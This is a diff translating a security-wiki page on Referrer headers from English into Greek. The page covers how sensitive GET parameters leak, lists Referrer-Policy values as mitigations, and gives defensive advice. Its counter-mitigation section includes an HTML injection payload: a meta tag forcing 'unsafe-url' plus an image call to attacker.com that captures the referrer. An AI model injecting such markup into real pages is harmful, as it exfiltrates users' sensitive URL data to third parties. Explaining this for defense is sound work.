@@ -2,16 +2,15 @@
 
 # Referrer headers and policy
 
-Referrer is the header used by browsers to indicate which was the previous page visited.
+Referrer είναι η κεφαλίδα που χρησιμοποιούν οι φυλλομετρητές για να υποδείξουν ποια ήταν η προηγούμενη σελίδα που επισκέφτηκε ο χρήστης.
 
-## Sensitive information leaked
+## Ευαίσθητες πληροφορίες που διαρρέουν
 
-If at some point inside a web page any sensitive information is located on a GET request parameters, if the page contains links to external sources or an attacker is able to make/suggest (social engineering) the user visit a URL controlled by the attacker. It could be able to exfiltrate the sensitive information inside the latest GET request.
+Αν σε κάποιο σημείο μέσα σε μια ιστοσελίδα οποιαδήποτε ευαίσθητη πληροφορία βρίσκεται σε παραμέτρους GET request, αν η σελίδα περιέχει συνδέσμους σε εξωτερικές πηγές ή αν ένας επιτιθέμενος είναι σε θέση να κάνει/προτείνει (κοινωνική μηχανική) στον χρήστη να επισκεφθεί μια διεύθυνση URL που ελέγχεται από τον επιτιθέμενο. Θα μπορούσε να είναι σε θέση να εξάγει τις ευαίσθητες πληροφορίες μέσα στην τελευταία GET request.
 
 ## Mitigation
 
-You can make the browser follow a **Referrer-policy** that could **avoid** the sensitive information to be sent to other web applications:
-
+Μπορείτε να κάνετε τον φυλλομετρητή να ακολουθεί μια **Referrer-policy** που θα μπορούσε να **αποφύγει** την αποστολή ευαίσθητων πληροφοριών σε άλλες διαδικτυακές εφαρμογές:
 ```
 Referrer-Policy: no-referrer
 Referrer-Policy: no-referrer-when-downgrade
@@ -22,19 +21,15 @@ Referrer-Policy: strict-origin
 Referrer-Policy: strict-origin-when-cross-origin
 Referrer-Policy: unsafe-url
 ```
+## Αντεπίθεση
 
-## Counter-Mitigation
-
-You can override this rule using an HTML meta tag (the attacker needs to exploit and HTML injection):
-
+Μπορείτε να παρακάμψετε αυτόν τον κανόνα χρησιμοποιώντας μια ετικέτα HTML meta (ο επιτιθέμενος πρέπει να εκμεταλλευτεί και μια ένεση HTML):
 ```markup
 <meta name="referrer" content="unsafe-url">
 <img src="https://attacker.com">
 ```
+## Άμυνα
 
-## Defense
-
-Never put any sensitive data inside GET parameters or paths in the URL.
+Ποτέ μην τοποθετείτε ευαίσθητα δεδομένα μέσα σε παραμέτρους GET ή διαδρομές στη διεύθυνση URL.
 
 {{#include ../banners/hacktricks-training.md}}
-
